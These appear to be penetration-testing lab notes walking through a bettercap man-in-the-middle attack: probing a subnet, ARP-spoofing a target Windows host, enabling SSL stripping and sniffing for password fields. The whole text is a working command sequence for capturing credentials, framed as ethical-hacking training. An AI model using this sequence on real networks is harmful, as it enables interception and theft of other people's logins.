- An ethical hacker or a penetration tester, you must know how MITM attacks work, so that you can protect your organization’s sensitive information from them. bettercap is a powerful, flexible, and portable tool created to perform various types of MITM attacks against a network; manipulate HTTP, HTTPS, and TCP traffic in real-time; sniff for credentials; etc.

- Here, we will use the bettercap tool to intercept HTTP traffic on the target system.
- Open Terminal
	> sudo su
	> cd
	> bettercap -iface -eth0 
	- **-iface**: specifies the interface to bind to (in this example, **eth0**).

	> net.probe on (This module will send different types of probe packets to each IP in the current subnet for the **net.recon** module to detect them)
	
	> net.recon on (This module is responsible for periodically reading the system ARP table to detect new hosts on the network)
		- The net.recon module displays the detected active IP addresses in the network. In real-time, this module will start sniffing network packets.

	> set http.proxy.sslstrip true (This module enables SSL stripping) - (SSL stripping is **a technique by which a website is downgraded from https to http**. In other words, the attack is used to circumvent the security which is enforced by SSL certificates on https sites. This is also known as SSL downgrading.)
	
	> set arp.spoof.internal true (This module spoofs the local connections among computers of the internal network)
	
	> set arp.spoof.targets 10.10.10.10 (This module spoofs the IP address of the target host.)
	
	> http.proxy on (This module initiates http proxy)
	
	> arp.spoof on (This module initiates arp spoofing)
	
	> net.sniff on (This module is responsible for performing sniffing on the network)
	
	> set net.sniff.regexp '.*password=.+' (This module will only consider the packets sent with a payload matching the given regular expression (in this case, **‘.*password=.+’**))
	
	- You can observe that bettercap starts sniffing network traffic on target machine **Windows 10**. 
		- bettercap collects all http logins used by routers, servers, and websites that do not have SSL enabled. In this task, we are using **www.moviescope.com** for demonstration purposes, as it is http-based. To use bettercap to sniff network traffic from https-based websites, you must enable the SSL strip module by issuing the command **set http.proxy.sslstrip true**.
